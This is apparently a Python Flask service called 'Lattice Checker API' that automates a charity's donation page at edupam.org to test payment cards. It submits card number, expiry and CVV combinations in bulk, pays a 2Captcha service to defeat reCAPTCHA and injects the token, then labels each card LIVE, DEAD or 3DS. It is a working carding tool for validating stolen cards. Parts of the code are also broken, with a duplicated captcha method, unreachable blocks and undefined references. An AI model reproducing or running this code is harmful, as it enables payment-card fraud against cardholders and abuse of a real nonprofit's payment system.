from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import re
import threading
import time
from datetime import datetime
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
import requests
import logging
from datetime import datetime
import base64 
import twocaptcha

# Configuración de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# Variables de entorno de Northflank
HEADLESS = os.environ.get('HEADLESS', 'true').lower() == 'true'
API_KEY_2CAPTCHA = os.environ.get('API_KEY_2CAPTCHA', '')
EDUPAM_DONOR_NAME = os.environ.get('EDUPAM_DONOR_NAME', 'Juan')
EDUPAM_DONOR_LASTNAME = os.environ.get('EDUPAM_DONOR_LASTNAME', 'Perez')
EDUPAM_DONOR_EMAIL = os.environ.get('EDUPAM_DONOR_EMAIL', 'juan.perez@example.com')
EDUPAM_BASE_URL = os.environ.get('EDUPAM_BASE_URL', 'https://www.edupam.org')
EDUPAM_ENDPOINT = os.environ.get('EDUPAM_ENDPOINT', '/mx/dona/')
DONATION_AMOUNT = int(os.environ.get('DONATION_AMOUNT', '50'))
MAX_WORKERS = int(os.environ.get('MAX_WORKERS', '5'))

# Variables globales de estado
checking_status = {
    'active': False,
    'processed': 0,
    'live': 0,
    'decline': 0,
    'threeds': 0,
    'error': 0,
    'current': '',
    'results': [],
    'thread': None,
    'stop_on_live': False
}

class CaptchaSolver:
    """Clase para resolver captchas usando librería oficial 2captcha"""
    
    def __init__(self, api_key):
        self.api_key = api_key
        self.solver = None
        
        if api_key:
            try:
                # Inicializar solver oficial
                self.solver = twocaptcha.TwoCaptcha(api_key)
                logger.info("✅ Solver 2Captcha inicializado con librería oficial")
            except Exception as e:
                logger.error(f"❌ Error inicializando 2Captcha: {e}")
                self.solver = None
    
    def solve_recaptcha_v2(self, site_key, page_url):
        """Resolver reCAPTCHA v2 usando librería oficial"""
        try:
            if not self.solver:
                logger.warning("⚠️ Solver de 2Captcha no inicializado")
                return None
            
            logger.info(f"🔄 Resolviendo reCAPTCHA v2 con librería oficial...")
            
            result = self.solver.recaptcha(
                sitekey=site_key,
                url=page_url,
                version='v2'
            )
            
            if result and result.get('code'):
                logger.info(f"✅ Captcha resuelto: {result['code'][:20]}...")
                return result['code']
            else:
                logger.error("❌ No se obtuvo solución del captcha")
                return None
                
        except Exception as e:
            logger.error(f"❌ Error en solve_recaptcha_v2: {e}")
            return None
        
        
class PaymentAnalyzer:
    """Analizador de respuestas de pagos para Edupam"""
    
    @staticmethod
    def analyze_payment_result(page, current_url, card_last4):
        """Versión mejorada con lógica más precisa"""
        evidence = []
        final_status = 'unknown'
        
        try:
            page_content = page.content()
            page_content_lower = page.content().lower()
            current_url_lower = current_url.lower()
            
            logger.info(f"🔍 ANALIZANDO para ****{card_last4}")
            logger.info(f"🔍 URL: {current_url}")
            
            # DEBUG: Ver contenido relevante
            debug_content = page_content_lower[:500]
            logger.info(f"🔍 CONTENIDO (500 chars): {debug_content}")
            
            # 1. Buscar palabras EXACTAS de DECLINE primero (más específico)
            decline_keywords = [
                'has been declined',
                'rechazada',
                'declined',
                'ocurrió un error',
                'incorrecto',
                'venció',
                'admite',
                'no válida',
                'invalid',
                'error en la transacción',
                'card has been declined'
            ]
            
            for keyword in decline_keywords:
                if keyword in page_content_lower:
                    final_status = 'decline'
                    evidence.append(f'DEAD: "{keyword}" encontrado')
                    logger.info(f"❌ ENCONTRADO '{keyword}' - ES DEAD")
                    break
            
            # 2. Si no es DEAD, buscar LIVE
            if final_status != 'decline':
                if '¡muchas gracias' in page_content_lower or 'muchas gracias' in page_content_lower:
                    final_status = 'live'
                    evidence.append('LIVE: palabra "Muchas gracias" encontradas')
                    logger.info(f"✅ ENCONTRADO 'muchas gracias' - Es LIVE")
                elif 'pago exitoso' in page_content_lower or 'success' in page_content_lower:
                    final_status = 'live'
                    evidence.append('LIVE: palabra de éxito encontrada')
                    logger.info(f"✅ ENCONTRADO palabra de éxito - Es LIVE")
            
            # 3. Solo buscar 3D Secure si no es LIVE ni DEAD
            if final_status == 'unknown':
                # Buscar específicamente en contexto de 3D
                if '3d secure' in page_content_lower or '3-d secure' in page_content_lower:
                    final_status = 'threeds'
                    evidence.append('3DS: "3D Secure" encontrado')
                    logger.info(f"🛡️ ENCONTRADO '3D Secure' - ES 3DS")
                elif 'authentication' in page_content_lower and 'secure' in page_content_lower:
                    final_status = 'threeds'
                    evidence.append('3DS: contexto de autenticación seguro encontrado')
                    logger.info(f"🛡️ ENCONTRADO contexto de autenticación - ES 3DS")
                # Evitar falsos positivos: solo marcar "secure" como 3DS si está en contexto de pago
                elif 'secure' in page_content_lower:
                    # Verificar contexto - no marcar si es parte de "high quality" u otras frases
                    if 'educación de alta calidad' not in page_content_lower:
                        final_status = 'threeds'
                        evidence.append('3DS: palabra "secure" encontrada')
                        logger.info(f"🛡️ ENCONTRADO 'secure' - ES 3DS")
            
            # 4. Si aún es unknown
            if final_status == 'unknown':
                evidence.append('NO se encontraron palabras clave claras')
                logger.info(f"❓ NO se encontraron palabras clave claras")
            
        except Exception as e:
            evidence.append(f'Error: {str(e)}')
            final_status = 'error'
            logger.error(f"❌ Error en análisis: {e}")
        
        return {
            'status': final_status,
            'evidence': evidence,
            'url': current_url
        }


class EdupamChecker:
    def __init__(self, headless=True):
        self.base_url = EDUPAM_BASE_URL
        self.endpoint = EDUPAM_ENDPOINT
        self.headless = headless
        self.donor_data = {
            'nombre': EDUPAM_DONOR_NAME,
            'apellido': EDUPAM_DONOR_LASTNAME,
            'email': EDUPAM_DONOR_EMAIL,
            'fecha_nacimiento': '1990-01-01',
            'tipo': 'one-time',
            'codigo': ''
        }
        self.analyzer = PaymentAnalyzer()
        self.captcha_solver = CaptchaSolver(API_KEY_2CAPTCHA) if API_KEY_2CAPTCHA else None
    
    def parse_card_data(self, card_string):
        """Parsear string de tarjeta en formato: NUMERO|MES|AÑO|CVV"""
        try:
            parts = card_string.strip().split('|')
            if len(parts) != 4:
                raise ValueError("Formato inválido")
            
            return {
                'numero': parts[0].strip().replace(' ', ''),
                'mes': parts[1].strip().zfill(2),
                'ano': parts[2].strip()[-2:],
                'cvv': parts[3].strip()
            }
        except Exception as e:
            logger.error(f"Error parseando tarjeta: {e}")
            return None
    
    def fill_form(self, page, amount):
        """Llenar formulario básico de donación"""
        try:
            # Nombre
            page.fill('#name', self.donor_data['nombre'])
            time.sleep(0.3)
            
            # Apellido
            page.fill('#lastname', self.donor_data['apellido'])
            time.sleep(0.3)
            
            # Email
            page.fill('#email', self.donor_data['email'])
            time.sleep(0.3)
            
            # Fecha de nacimiento
            page.fill('#birthdate', self.donor_data['fecha_nacimiento'])
            time.sleep(0.3)
            
            # Monto
            page.fill('#quantity', str(amount))
            time.sleep(0.5)
            
            return True
        except Exception as e:
            logger.error(f"Error llenando formulario: {e}")
            return False
    
    def fill_card_simple(self, page, card_info):
        """Llenar datos de tarjeta usando método TAB"""
        try:
            # Hacer clic en el campo de monto para asegurar focus
            page.locator('#quantity').click()
            time.sleep(0.5)
            
            # Presionar TAB para ir al primer campo de tarjeta
            page.keyboard.press('Tab')
            time.sleep(1)
            
            # Escribir número de tarjeta
            page.keyboard.press('Control+A')
            page.keyboard.press('Backspace')
            time.sleep(0.2)
            
            page.keyboard.type(card_info['numero'], delay=50)
            time.sleep(1.5)
            
            # Esperar TAB automático y escribir fecha
            fecha = card_info['mes'] + card_info['ano']
            page.keyboard.type(fecha, delay=50)
            time.sleep(1.5)
            
            # Esperar TAB automático y escribir CVC
            page.keyboard.type(card_info['cvv'], delay=50)
            time.sleep(1)
            
            return True
        except Exception as e:
            logger.error(f"Error llenando tarjeta: {e}")
            return False
    
    def solve_captcha_if_present(self, page, card_last4):
        """Detectar y resolver captcha si está presente"""
        try:
            # Esperar un momento para que cargue el captcha si existe
            time.sleep(3)
            
            # Verificar si hay reCAPTCHA v2 presente
            captcha_found = False
            site_key = None
            
            # Buscar diferentes patrones de reCAPTCHA
            checkbox_selectors = [
                'div.recaptcha-checkbox',
                '.recaptcha-checkbox-border',
                'div[role="checkbox"]',
                'iframe[title*="recaptcha"]',
                '#recaptcha-anchor'
            ]
            
            for selector in checkbox_selectors:
                try:
                    if page.locator(selector).count() > 0:
                        page.locator(selector).click
                        logger.info(f"✅ Haciendo clic en checkbox 'I'm human' con selector: {selector}")
                        
                        time.sleep(1)
                        break
                except:
                    continue
            
        except Exception as e:
            logger.warning(f"⚠️ No se pudo hacer clic en checkbox: {e}")
                    
            # Resolver captcha
            logger.info(f"🔄 Resolviendo captcha para ****{card_last4}...")
            page_url = page.url
            solution = self.captcha_solver.solve_recaptcha_v2(site_key, page_url)
            
            if not solution:
                logger.error(f"❌ No se pudo resolver el captcha para ****{card_last4}")
                return False
            
            logger.info(f"✅ Captcha resuelto para ****{card_last4}")
            
            # Inyectar la solución en la página
            try:
                # Ejecutar script para llenar el campo g-recaptcha-response
                page.evaluate(f"""
                    () => {{
                        // Buscar el textarea de respuesta
                        const responseField = document.getElementById('g-recaptcha-response');
                        if (responseField) {{
                            responseField.value = '{solution}';
                            responseField.dispatchEvent(new Event('change', {{ bubbles: true }}));
                            console.log('✅ Captcha solution injected');
                            return true;
                        }}
                        
                        // Si no existe, intentar encontrar por nombre
                        const responseByName = document.querySelector('[name="g-recaptcha-response"]');
                        if (responseByName) {{
                            responseByName.value = '{solution}';
                            responseByName.dispatchEvent(new Event('change', {{ bubbles: true }}));
                            console.log('✅ Captcha solution injected by name');
                            return true;
                        }}
                        
                        // Crear campo si no existe
                        const newField = document.createElement('textarea');
                        newField.id = 'g-recaptcha-response';
                        newField.name = 'g-recaptcha-response';
                        newField.style.display = 'none';
                        newField.value = '{solution}';
                        document.body.appendChild(newField);
                        console.log('✅ Created and injected captcha solution');
                        return true;
                    }}
                """)
                
                # Pequeña espera para que se procese
                time.sleep(2)
                
                # Volver a hacer clic en el botón de donar después de resolver captcha
                btn = page.locator('#btn-donation')
                if btn.count() > 0:
                    btn.click()
                    logger.info(f"✅ Re-enviando formulario con captcha resuelto para ****{card_last4}")
                    time.sleep(3)  # Esperar después del segundo envío
                
                return True
                
            except Exception as e:
                logger.error(f"❌ Error inyectando solución de captcha para ****{card_last4}: {e}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Error en solve_captcha_if_present para ****{card_last4}: {e}")
            return False


        """Detectar y resolver captcha si está presente"""
        try:
            # Esperar un momento para que cargue el captcha si existe
            time.sleep(3)
            
            # Verificar si hay reCAPTCHA v2 presente
            captcha_found = False
            site_key = None
            
            # Buscar diferentes patrones de reCAPTCHA
            selectors_to_check = [
                'div[data-sitekey]',
                '.g-recaptcha',
                'iframe[src*="google.com/recaptcha"]',
                'iframe[title*="reCAPTCHA"]'
            ]
            
            for selector in selectors_to_check:
                try:
                    if page.locator(selector).count() > 0:
                        captcha_found = True
                        logger.info(f"🛡️ Captcha detectado con selector: {selector}")
                        
                        # Intentar obtener site-key
                        if 'data-sitekey' in selector:
                            site_key = page.locator(selector).first.get_attribute('data-sitekey')
                        else:
                            # Buscar el div con data-sitekey dentro del contenedor
                            site_key = page.locator(f'{selector} [data-sitekey]').first.get_attribute('data-sitekey')
                            if not site_key:
                                # Intentar obtener del iframe
                                iframe_src = page.locator('iframe[src*="google.com/recaptcha"]').first.get_attribute('src')
                                if iframe_src:
                                    # Extraer site-key de la URL del iframe
                                    match = re.search(r'k=([^&]+)', iframe_src)
                                    if match:
                                        site_key = match.group(1)
                        
                        if site_key:
                            logger.info(f"✅ Site-key encontrado: {site_key[:20]}...")
                        break
                except:
                    continue
            
            if not captcha_found:
                logger.info(f"✅ No se detectó captcha para ****{card_last4}")
                return True
            
            if not site_key:
                logger.warning(f"⚠️ Captcha detectado pero no se pudo obtener site-key para ****{card_last4}")
                return False
            
            if not self.captcha_solved:
                logger.error(f"❌ API key de 2Captcha no configurada para ****{card_last4}")
                return False
            
            # Resolver captcha
            logger.info(f"🔄 Resolviendo captcha para ****{card_last4}...")
            page_url = page.url
            solution = self.captcha_solved.solve_recaptcha_v2(site_key, page_url)
            
            if not solution:
                logger.error(f"❌ No se pudo resolver el captcha para ****{card_last4}")
                return False
            
            logger.info(f"✅ Captcha resuelto para ****{card_last4}")
            
            # Inyectar la solución en la página
            try:
                # Ejecutar script para llenar el campo g-recaptcha-response
                page.evaluate(f"""
                    () => {{
                        // Buscar el textarea de respuesta
                        const responseField = document.getElementById('g-recaptcha-response');
                        if (responseField) {{
                            responseField.value = '{solution}';
                            responseField.dispatchEvent(new Event('change', {{ bubbles: true }}));
                            console.log('✅ Captcha solution injected');
                            return true;
                        }}
                        
                        // Si no existe, intentar encontrar por nombre
                        const responseByName = document.querySelector('[name="g-recaptcha-response"]');
                        if (responseByName) {{
                            responseByName.value = '{solution}';
                            responseByName.dispatchEvent(new Event('change', {{ bubbles: true }}));
                            console.log('✅ Captcha solution injected by name');
                            return true;
                        }}
                        
                        // Crear campo si no existe
                        const newField = document.createElement('textarea');
                        newField.id = 'g-recaptcha-response';
                        newField.name = 'g-recaptcha-response';
                        newField.style.display = 'none';
                            newField.value = '{solution}';
                            document.body.appendChild(newField);
                            console.log('✅ Created and injected captcha solution');
                            return true;
                        }}
                    """)
                
                # Pequeña espera para que se procese
                time.sleep(2)
                
                # === AÑADE ESTO: Hacer clic en el checkbox "I'm human" ===
                try:
                    # Buscar y hacer clic en el checkbox del captcha
                    checkbox_selectors = [
                        'div.recaptcha-checkbox',
                        '.recaptcha-checkbox-border',
                        'div[role="checkbox"]',
                        '#recaptcha-anchor',
                        'iframe[title*="recaptcha"]'
                    ]
                    
                    for selector in checkbox_selectors:
                        try:
                            if page.locator(selector).count() > 0:
                                page.locator(selector).click()
                                logger.info(f"✅ Haciendo clic en checkbox con selector: {selector}")
                                time.sleep(1)
                                break
                        except:
                            continue
                    
                    # También intentar con JavaScript
                    page.evaluate("""
                        () => {
                            // Intentar encontrar y hacer clic en el checkbox
                            const checkboxes = document.querySelectorAll('[role="checkbox"], .recaptcha-checkbox, #recaptcha-anchor');
                            checkboxes.forEach(cb => {
                                if (cb.getAttribute('aria-checked') === 'false' || 
                                    !cb.getAttribute('aria-checked')) {
                                    cb.click();
                                }
                            });
                            return checkboxes.length > 0;
                        }
                    """)
                    
                except Exception as e:
                    logger.warning(f"⚠️ No se pudo hacer clic en checkbox: {e}")
                # === FIN DEL AÑADIDO ===
                
                # Volver a hacer clic en el botón de donar después de resolver captcha
                btn = page.locator('#btn-donation')
                if btn.count() > 0:
                    btn.click()
                    logger.info(f"✅ Re-enviando formulario con captcha resuelto para ****{card_last4}")
                    time.sleep(3)  # Esperar después del segundo envío
                
                return True
                
            except Exception as e:
                logger.error(f"❌ Error inyectando solución de captcha para ****{card_last4}: {e}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Error en solve_captcha_if_present para ****{card_last4}: {e}")
            return False
    def check_single_card(self, card_string, amount=50):
        """Verificar una sola tarjeta - CIERRA después de cada una"""
        card_last4 = card_string.split('|')[0][-4:] if '|' in card_string else '????'
        logger.info(f"🚀 INICIANDO NUEVA VERIFICACIÓN para ****{card_last4}")
        
        # Parsear tarjeta
        card_info = self.parse_card_data(card_string)
        if not card_info:
            return {
                'success': False,
                'status': 'error',
                'message': 'Error parseando tarjeta',
                'card': card_last4
            }
        
        playwright = None
        browser = None
        page = None
        
        try:
            logger.info(f"1. Iniciando Playwright FRESCO...")
            playwright = sync_playwright().start()
            
            logger.info(f"2. Lanzando Chromium NUEVO...")
            browser = playwright.chromium.launch(
                executable_path='/usr/bin/chromium',
                headless=True,
                args=['--no-sandbox', '--disable-setuid-sandbox']
            )
            
            logger.info(f"3. Creando contexto NUEVO...")
            context = browser.new_context()
            
            logger.info(f"4. Creando página NUEVA...")
            page = context.new_page()
            
            # Navegar
            logger.info(f"5. Navegando a {self.base_url}{self.endpoint}...")
            page.goto(f"{self.base_url}{self.endpoint}", timeout=30000)
            time.sleep(3)
            
            # Verificar URL
            logger.info(f"6. URL actual: {page.url}")
            
            # Llenar formulario
            logger.info(f"7. Llenando formulario...")
            if not self.fill_form(page, amount):
                return {
                    'success': False,
                    'status': 'ERROR',
                    'message': 'Error llenando formulario',
                    'card': card_last4
                }
            
            # Ingresar tarjeta
            logger.info(f"8. Ingresando tarjeta ****{card_last4}...")
            if not self.fill_card_simple(page, card_info):
                return {
                    'success': False,
                    'status': 'ERROR',
                    'message': 'Error ingresando tarjeta',
                    'card': card_last4
                }
            
            time.sleep(2)
            
            # Enviar
            logger.info(f"9. Enviando donación...")
            btn = page.locator('#btn-donation')
            if btn.count() == 0:
                return {
                    'success': False,
                    'status': 'ERROR',
                    'message': 'Botón no encontrado',
                    'card': card_last4
                }
            
            btn.click()
            
            # Intentar resolver captcha si aparece
            captcha_solved = True
            if self.captcha_solver:
                logger.info(f"10. Verificando captcha para ****{card_last4}...")
                captcha_solved = self.solve_captcha_if_present(page, card_last4)
            
            # Esperar respuesta después del captcha (o sin captcha)
            wait_time = 10 if captcha_solved else 5
            logger.info(f"11. Esperando respuesta ({wait_time} segundos)...")
            time.sleep(wait_time)
            
            # DEBUG EXTREMO
            logger.info(f"12. URL DESPUÉS de enviar: {page.url}")
            page_text = page.content()
            logger.info(f"13. HTML (200 chars): {page_text[:200]}")
            
            # Tomar screenshot ÚNICO para esta tarjeta
            screenshot_b64 = None
            try:
                # 1. Hacer scroll para forzar renderizado de elementos lazy
                page.evaluate("""
                    () => {
                        const height = document.body.scrollHeight;
                        window.scrollTo(0, height);
                        window.scrollTo(0, 0);
                    }
                """)
                
                # 2. Esperar un poco después del scroll
                page.wait_for_timeout(300)
                
                # 3. Obtener altura total REAL (puede haber cambiado después del scroll)
                total_height = page.evaluate("""
                    () => {
                        return Math.max(
                            document.body.scrollHeight,
                            document.documentElement.scrollHeight
                        );
                    }
                """)
                
                # 4. Ajustar viewport si es necesario
                current_viewport = page.viewport_size
                if total_height > current_viewport['height']:
                    page.set_viewport_size({
                        'width': current_viewport['width'],
                        'height': total_height + 50  # Margen extra por seguridad
                    })
                
                # 5. Esperar a que se re-renderice con el nuevo tamaño
                page.wait_for_timeout(1000)
                
                # 6. Tomar screenshot
                screenshot_bytes = page.screenshot(full_page=True)
                screenshot_b64 = base64.b64encode(screenshot_bytes).decode('utf-8')
                logger.info(f"14. 📸 Screenshot ÚNICO tomado para ****{card_last4}")
                
            except Exception as e:
                logger.error(f"Error screenshot: {e}")
            
            # Analizar
            current_url = page.url
            analysis = self.analyzer.analyze_payment_result(
                page, current_url, card_last4
            )
            
            # Resultado
            status_map = {'live': 'LIVE', 'decline': 'DEAD', 'threeds': '3DS', 'unknown': 'ERROR'}
            final_status = status_map.get(analysis['status'], 'ERROR')
            
            messages = {
                'LIVE': '✅ Tarjeta aprobada - Donación exitosa',
                'DEAD': '❌ Tarjeta declinada - Fondos insuficientes',
                '3DS': '🛡️ 3D Secure requerido - Autenticación necesaria',
                'ERROR': '⚠️ Error desconocido - Verificación manual requerida'
            }
            
            # Añadir información sobre captcha
            evidence = analysis['evidence']
            if not captcha_solved and self.captcha_solver:
                evidence.append('⚠️ No se pudo resolver captcha')
            
            result = {
                'success': True,
                'status': final_status,
                'original_status': messages.get(final_status, 'Estado desconocido'),
                'message': ', '.join(evidence),
                'response': {
                    'url': analysis['url'],
                    'evidence': analysis['evidence'],
                    'screenshot': screenshot_b64,
                    'timestamp': datetime.now().isoformat(),
                    'captcha_solved': captcha_solved
                },
                'card': f"****{card_last4}",
                'gate': 'Edupam',
                'amount': amount
            }
            
            logger.info(f"15. ✅ Verificación COMPLETADA para ****{card_last4}: {final_status}")
            
            # CERRAR TODO
            logger.info(f"16. Cerrando recursos...")
            try:
                page.close()
                context.close()
                browser.close()
                playwright.stop()
                logger.info(f"17. ✅ Recursos CERRADOS para ****{card_last4}")
            except Exception as e:
                logger.error(f"Error cerrando: {e}")
            
            return result
            
        except Exception as e:
            logger.error(f"❌ ERROR en ****{card_last4}: {e}")
            # CERRAR TODO
            try:
                if page and not page.is_closed():
                    page.close()
                if browser:
                    browser.close()
                if playwright:
                    playwright.stop()
            except:
                pass
            
            return {
                'success': False,
                'status': 'ERROR',
                'message': f'Error: {str(e)[:100]}',
                'card': card_last4
            }



# ========== FUNCIONES DEL WORKER ==========

def process_cards_worker(cards, amount, stop_on_live):
    """Worker que procesa las tarjetas"""
    global checking_status
    
    checker = EdupamChecker(headless=HEADLESS)
    
    for i, card_line in enumerate(cards):
        if not checking_status['active']:
            break
        
        try:
            parts = card_line.strip().split('|')
            if len(parts) < 4:
                checking_status['error'] += 1
                checking_status['results'].append({
                    'id': i + 1,
                    'card': 'INVALID',
                    'status': 'ERROR',
                    'message': 'Formato inválido',
                    'timestamp': datetime.now().isoformat()
                })
                continue
            
            card_number = parts[0].strip()
            last4 = card_number[-4:] if len(card_number) >= 4 else '????'
            checking_status['current'] = f"****{last4}"
            
            logger.info(f"Procesando tarjeta {i+1}/{len(cards)}: ****{last4}")
            
            # Verificar tarjeta
            result = checker.check_single_card(card_line, amount)
            
            # Crear resultado
            card_result = {
                'id': i + 1,
                'card': f"****{last4}",
                'full_card': card_line,
                'status': result.get('status', 'ERROR'),
                'original_status': result.get('original_status', ''),
                'message': result.get('message', ''),
                'gate': result.get('gate', 'Edupam'),
                'amount': amount,
                'timestamp': datetime.now().isoformat(),
                'response': result.get('response', {}),
                'success': result.get('success', False)
            }
            
            # Actualizar estadísticas
            checking_status['processed'] += 1
            checking_status['results'].append(card_result)
            
            if result.get('status') == 'LIVE':
                checking_status['live'] += 1
                if stop_on_live:
                    checking_status['active'] = False
                    break
            elif result.get('status') == 'DEAD':
                checking_status['decline'] += 1
            elif result.get('status') == '3DS':
                checking_status['threeds'] += 1
            else:
                checking_status['error'] += 1
            
            # Pequeño delay entre tarjetas
            time.sleep(2)
            
        except Exception as e:
            logger.error(f"Error procesando tarjeta: {e}")
            checking_status['error'] += 1
            checking_status['results'].append({
                'id': i + 1,
                'card': 'ERROR',
                'status': 'ERROR',
                'message': f'Error: {str(e)}',
                'timestamp': datetime.now().isoformat()
            })
            continue
    
    checking_status['active'] = False


# ========== ENDPOINTS API ==========

@app.route('/')
def index():
    """Endpoint raíz del backend"""
    return jsonify({
        "status": "online",
        "service": "Lattice Checker API (Edupam)",
        "version": "2.1",
        "endpoints": {
            "health": "/api/health",
            "status": "/api/status",
            "check_card": "/api/check-card (POST)",
            "check_cards": "/api/check (POST)",
            "results": "/api/results",
            "cancel": "/api/cancel (POST)"
        },
        "config": {
            "headless": HEADLESS,
            "donation_amount": DONATION_AMOUNT,
            "max_workers": MAX_WORKERS,
            "2captcha": "enabled" if API_KEY_2CAPTCHA else "disabled"
        }
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    """Verificar estado del servidor"""
    return jsonify({
        'status': 'online',
        'service': 'Lattice Checker API',
        'version': '2.1',
        'timestamp': datetime.now().isoformat(),
        'features': {
            'captcha_support': bool(API_KEY_2CAPTCHA),
            'screenshots': True,
            'multi_card_check': True
        }
    })

@app.route('/api/status', methods=['GET'])
def get_status():
    """Obtener estado actual del checker"""
    return jsonify({
        'active': checking_status['active'],
        'processed': checking_status['processed'],
        'live': checking_status['live'],
        'decline': checking_status['decline'],
        'threeds': checking_status['threeds'],
        'error': checking_status['error'],
        'current': checking_status['current'],
        'total': len(checking_status['results']),
        'captcha_enabled': bool(API_KEY_2CAPTCHA)
    })

@app.route('/api/check-card', methods=['POST'])
def check_single_card():
    """Verificar una sola tarjeta (para el frontend)"""
    global checking_status
    
    if checking_status['active']:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Ya hay un chequeo en progreso'
        }), 400
    
    data = request.json
    
    # Extraer datos
    card_data = data.get('card', '')
    cookies = data.get('cookies', '')  # Mantener para compatibilidad
    
    if not card_data or '|' not in card_data:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Formato de tarjeta inválido',
            'original_status': '⚠️ Error'
        }), 400
    
    # Parsear tarjeta
    parts = card_data.split('|')
    if len(parts) < 4:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Formato de tarjeta incompleto',
            'original_status': '⚠️ Error'
        }), 400
    
    card_number = parts[0].strip()
    
    # Validar formato básico
    if not card_number.isdigit() or len(card_number) not in [15, 16]:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Número de tarjeta inválido',
            'original_status': '⚠️ Error'
        }), 400
    
    # Verificar tarjeta
    checker = EdupamChecker(headless=HEADLESS)
    result = checker.check_single_card(card_data, DONATION_AMOUNT)
    
    return jsonify(result)

@app.route('/api/check', methods=['POST'])
def check_cards():
    """Iniciar verificación de múltiples tarjetas"""
    global checking_status
    
    if checking_status['active']:
        return jsonify({'error': 'Ya hay un chequeo en progreso'}), 400
    
    data = request.json
    cards = data.get('cards', [])
    amount = data.get('amount', DONATION_AMOUNT)
    stop_on_live = data.get('stop_on_live', False)
    
    if not cards:
        return jsonify({'error': 'No hay tarjetas para verificar'}), 400
    
    # Filtrar tarjetas válidas
    valid_cards = []
    for card in cards:
        if '|' in card and len(card.split('|')) >= 4:
            valid_cards.append(card)
    
    if not valid_cards:
        return jsonify({'error': 'No hay tarjetas válidas'}), 400
    
    # Inicializar estado
    checking_status = {
        'active': True,
        'processed': 0,
        'live': 0,
        'decline': 0,
        'threeds': 0,
        'error': 0,
        'current': '',
        'results': [],
        'thread': None,
        'stop_on_live': stop_on_live
    }
    
    # Iniciar thread de verificación
    thread = threading.Thread(
        target=process_cards_worker,
        args=(valid_cards, amount, stop_on_live)
    )
    thread.daemon = True
    thread.start()
    checking_status['thread'] = thread
    
    return jsonify({
        'success': True,
        'message': f'Verificación iniciada para {len(valid_cards)} tarjetas',
        'total': len(valid_cards),
        'amount': amount,
        'captcha_enabled': bool(API_KEY_2CAPTCHA)
    })

@app.route('/api/results', methods=['GET'])
def get_results():
    """Obtener resultados del chequeo"""
    return jsonify({
        'results': checking_status['results'][-100:],
        'stats': {
            'total': len(checking_status['results']),
            'live': checking_status['live'],
            'decline': checking_status['decline'],
            'threeds': checking_status['threeds'],
            'error': checking_status['error']
        },
        'captcha_enabled': bool(API_KEY_2CAPTCHA)
    })

@app.route('/api/cancel', methods=['POST'])
def cancel_check():
    """Cancelar chequeo en curso"""
    global checking_status
    checking_status['active'] = False
    return jsonify({'success': True, 'message': 'Chequeo cancelado'})

# ========== INICIALIZACIÓN ==========

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    debug = os.environ.get('FLASK_ENV', 'production') == 'development'
    
    logger.info(f"🚀 Server starting on port {port}")
    logger.info(f"🔧 Config:")
    logger.info(f"   Headless: {HEADLESS}")
    logger.info(f"   Donation amount: ${DONATION_AMOUNT}")
    logger.info(f"   Max workers: {MAX_WORKERS}")
    logger.info(f"   2Captcha: {'ENABLED' if API_KEY_2CAPTCHA else 'DISABLED'}")
    
    if API_KEY_2CAPTCHA:
        logger.info(f"   Captcha Solver: ✅ Integrado y listo")
    else:
        logger.warning(f"   Captcha Solver: ⚠️ NO configurado - Los captchas no se resolverán")
    
    app.run(host='0.0.0.0', port=port, debug=debug)